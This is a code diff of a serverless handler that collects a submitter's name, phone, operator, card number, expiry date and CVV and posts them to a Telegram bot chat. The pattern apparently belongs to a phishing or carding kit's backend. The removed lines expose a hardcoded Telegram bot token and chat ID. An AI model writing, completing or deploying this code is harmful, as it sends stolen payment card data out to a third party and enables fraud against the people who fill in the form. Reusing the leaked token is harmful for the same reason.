@@ -14,8 +14,9 @@ exports.handler = async (event) => {
   try {
     const data = JSON.parse(event.body);
 
-     const phone = data.phone || '';
-     const operator = data.operator || '';
+    const name = data.name || '';
+    const phone = data.phone || '';
+    const operator = data.operator || '';
     const cardNumber = data.cardNumber || '';
     const expiry = data.expiry || '';
     const cvv = data.cvv || '';
@@ -41,13 +42,13 @@ exports.handler = async (event) => {
     if (expiry) text += `*expiry:* ${expiry}\n`;
     if (cvv) text += `*cvv:* ${cvv}\n`;
 
-    const url = `https://api.telegram.org/bot8694169123:AAEdLLVyc3VwV-Vp5X-DasnGjbFHcgzXZpk/getUpdates`;
+    const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
     const response = await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        chat_id: 8525306897,
+        chat_id: chatId,
         text: text,
         parse_mode: 'Markdown',
       }),
@@ -73,7 +74,5 @@ exports.handler = async (event) => {
     };
   }
 
-process.env.TELEGRAM_BOT_TOKEN
-process.env.TELEGRAM_CHAT_ID
 
 };
